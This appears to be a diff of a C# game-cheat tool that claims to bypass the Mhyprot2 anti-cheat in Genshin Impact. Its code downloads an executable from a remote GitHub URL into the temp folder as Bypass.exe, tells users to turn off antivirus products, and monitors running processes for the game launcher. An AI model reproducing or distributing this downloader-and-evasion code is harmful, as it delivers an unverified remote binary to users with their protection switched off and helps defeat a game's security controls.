@@ -11,14 +11,19 @@ namespace Bypasser_Mhyprot2
 {
     public class Program
     {
+        
         static void Bypass()
         {
+            
             bool Program = false;
             try
             {
                 //credit to DesirePro(FUCK#9803)
                 WebClient webClient = new WebClient();
+                Console.WriteLine("Getting Bypasser Ready....");
                 webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/ggAC.exe"), Path.Combine(Path.GetTempPath(), "Bypass.exe"));
+                Console.WriteLine("Ready Set...");
+                
                 if (File.Exists(Path.Combine(Path.GetTempPath(), "Bypass.exe")) && new FileInfo(Path.Combine(Path.GetTempPath(), "Bypass.exe")).Length > 10L)
                 {
                     Program = true;
@@ -28,8 +33,7 @@ namespace Bypasser_Mhyprot2
                     string msg_1 = "Turn Off Other Anti Virus";
                     string msg_2 = "Bitdefender, Avast, Windows's Anti Virus";
                     Console.WriteLine("Please Turn Off Anti-Virus");
-                    Console.WriteLine("");
-                    Console.WriteLine("Check If These Are Active -");
+                    Console.WriteLine("Check These Anti Virus Are Running/Etc... -> \n");
                     Console.WriteLine(msg_1 + msg_2);
                     Console.ReadKey();
                 }
@@ -49,6 +53,7 @@ namespace Bypasser_Mhyprot2
                 Console.WriteLine("Oops Somehing Went Wrong!" + arg);
             }
         }
+        
         private static void RandomName()
         {
             Console.Title = "";
@@ -58,19 +63,25 @@ namespace Bypasser_Mhyprot2
                 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                 '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
             };
+            
             for (int r = 35; r < 75; r++)
                 Console.Title += pwdChars[rnd.Next(0, 60)];
             Thread.Sleep(10);
         }
+        
         const string Chars = "awdauUWHU2Dw722322tyuawDawwGG3hwd";
         static string RandomString(int length)
         {
             Random random = new Random();
             return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
         }
+        
+        
         [STAThread]
         [DebuggerNonUserCode]
         [GeneratedCode("PresentationBuildTasks", "1.2.0.0")]
+        
+        
         public static void Main(string[] args)
         {
             RandomName();
@@ -81,11 +92,8 @@ namespace Bypasser_Mhyprot2
                 Console.WriteLine("Closing Mhyprot2... Wait....");
                 Thread.Sleep(10);
                 Console.Clear();
-                Console.WriteLine("Bypassed");
+                Console.WriteLine("Bypassed \n " + "\n" + "\n");
                 Console.Beep();
-                Console.WriteLine();
-                Console.WriteLine();
-                Console.WriteLine();
                 Console.WriteLine(" credit to DesirePro(FUCK#9803) ");
                 Console.WriteLine(" Made By Dwaine#0572 ");
                 Console.ReadLine();
@@ -106,8 +114,7 @@ namespace Bypasser_Mhyprot2
                     process.WaitForInputIdle();
                     Console.WriteLine("Launcher.exe PID : " + process.Id);
                     Process[] processCollection = Process.GetProcesses();
-                    Console.WriteLine("Wait While The Program Is Listening To Process");
-                    Console.WriteLine();
+                    Console.WriteLine("Wait While The Program Is Listening To Process \n");
                     foreach (Process p in processCollection)
                     {
                         Console.WriteLine(p.ProcessName);
@@ -140,35 +147,25 @@ namespace Bypasser_Mhyprot2
             Thread.Sleep(100);
             Console.Clear();
             Console.Beep();
-            Console.WriteLine("Instruction : ");
-            Console.WriteLine("");
+            Console.WriteLine("Instruction : \n");
             Console.WriteLine("Load Into The Game Completely");
             Console.WriteLine("Reopen This Bypasser");
             Console.Clear();
             Console.WriteLine("Wait While The Program Is Listening To Process");
-            Console.WriteLine("Opened Luncher For You...");
-            Console.WriteLine();
+            Console.WriteLine("Opened Luncher For You... \n");
             Console.WriteLine("Load The Game Completely and Open This Bypasser");
-            Console.WriteLine("Beep Sound = Succesfully Bypassed");
-            Console.WriteLine();
-            Console.WriteLine();
-            Console.WriteLine("Process ID Of Genshin Impact Cannot Found... ");
+            Console.WriteLine("Beep Sound = Succesfully Bypassed \n" + "\n");
+            Console.WriteLine("Process ID Of Genshin Impact Cannot Found... \n" + "\n");
             Thread.Sleep(10);
-            Console.WriteLine();
-            Console.WriteLine();
             Console.WriteLine("credit to DesirePro(FUCK#9803)");
-            Console.WriteLine("Made By Dwaine#0572");
-            Console.WriteLine();
+            Console.WriteLine("Made By Dwaine#0572 \n");
             Thread.Sleep(10000);
             Console.Clear();
 
-
-
             for (int a = 5; a >= 0; a--)
             {
-                Console.Write("\rClosing Program in {0:00}", a);
+                Console.Write("\rClosing Program in {0:00}", a + "\n");
                 System.Threading.Thread.Sleep(1000);
-                Console.WriteLine();
                 Console.WriteLine("credit to DesirePro(FUCK#9803)");
                 Console.WriteLine("Made By Dwaine#0572");
             }
